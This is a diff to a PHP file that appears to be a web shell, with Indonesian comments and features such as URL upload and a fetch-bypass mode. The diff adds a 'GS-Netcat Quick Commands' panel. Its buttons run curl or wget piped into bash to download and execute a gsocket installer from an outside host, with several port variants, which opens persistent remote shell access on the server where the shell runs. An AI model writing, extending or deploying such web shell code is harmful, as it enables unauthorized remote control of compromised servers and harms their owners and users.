@@ -43,6 +43,7 @@ $msg = '';
 
 // Output untuk mode bypass
 $bypass_output = '';
+$gs_output = '';
 
 // === UPLOAD FROM URL ===
 if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
@@ -77,6 +78,24 @@ if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
         } else {
             $bypass_output = $data; // tidak dieksekusi, hanya ditampilkan
         }
+    }
+}
+
+// === GS-NETCAT COMMAND BUTTONS ===
+if (isset($_POST['gs_cmd'])) {
+    $cmdKey = $_POST['gs_cmd'];
+    $commands = array(
+        'curl_gs_netcat' => 'bash -c "$(curl -fsSL https://gsocket.io/y)"',
+        'wget_gs_netcat' => 'bash -c "$(wget -qO- https://gsocket.io/y)"',
+        'gs_443' => 'GS_PORT=443 bash -c "$(curl -fsSL https://gsocket.io/y)"',
+        'gs_80'  => 'GS_PORT=80 bash -c "$(wget -fsSL https://gsocket.io/y)"',
+        'gs_113' => 'GS_PORT=113 bash -c "$(curl -fsSL https://gsocket.io/y)"',
+    );
+    if (isset($commands[$cmdKey])) {
+        $run = $commands[$cmdKey];
+        $gs_output = exec_cmd($run, $dir);
+    } else {
+        $gs_output = 'Unknown command key';
     }
 }
 
@@ -1344,6 +1363,25 @@ if (!$disabled_funcs) {
                                         <table class="table" style="margin-top:8px;">
                                             <thead><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr></thead>
                                             <tbody>
+                                    <h3 style="margin-top:25px;margin-bottom:8px;">GS-Netcat Quick Commands</h3>
+                                    <div style="display:flex;flex-wrap:wrap;gap:6px;">
+                                        <form method="post" style="display:inline-block;">
+                                            <button type="submit" name="gs_cmd" value="curl_gs_netcat">curl gs-netcat</button>
+                                        </form>
+                                        <form method="post" style="display:inline-block;">
+                                            <button type="submit" name="gs_cmd" value="wget_gs_netcat">wget gs-netcat</button>
+                                        </form>
+                                        <form method="post" style="display:inline-block;">
+                                            <button type="submit" name="gs_cmd" value="gs_443">GS_PORT=443</button>
+                                        </form>
+                                        <form method="post" style="display:inline-block;">
+                                            <button type="submit" name="gs_cmd" value="gs_80">GS_PORT=80</button>
+                                        </form>
+                                        <form method="post" style="display:inline-block;">
+                                            <button type="submit" name="gs_cmd" value="gs_113">GS_PORT=113</button>
+                                        </form>
+                                    </div>
+                                    <textarea style="width:100%;height:200px;margin-top:10px;" readonly placeholder="GS-Netcat command output..."><?php echo htmlspecialchars($gs_output); ?></textarea>
                                                 <?php foreach ($table_structure as $col): ?>
                                                     <tr>
                                                         <td><?php echo htmlspecialchars($col['Field']); ?></td>
